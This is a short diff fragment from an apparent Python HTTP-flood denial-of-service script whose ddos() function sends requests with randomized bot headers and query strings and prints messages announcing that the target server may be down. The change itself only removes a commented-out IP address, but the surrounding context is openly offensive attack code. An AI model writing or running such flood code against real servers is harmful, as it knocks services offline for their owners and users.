@@ -18,7 +18,6 @@ def ddos():
         'Referer': random.choice(bots) + build_querystr(random.randint(50, 100)), 'Cache-Control': 'no-cache','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','Keep-Alive': random.randint(110, 160), 'Connection': 'keep-alive'})
         urllib.request.urlopen(item)
         print("[+] BOT REQUEST SENT TO SERVER ---> WAITING FOR SERVER TO BE DOWN.")
-        #182.64.10.172
     except urllib.error.HTTPError as e:
         if "500" in str(e):
             print("[+] INTERNAL SERVER ERROR ---> SERVER MAY BE DOWN!")
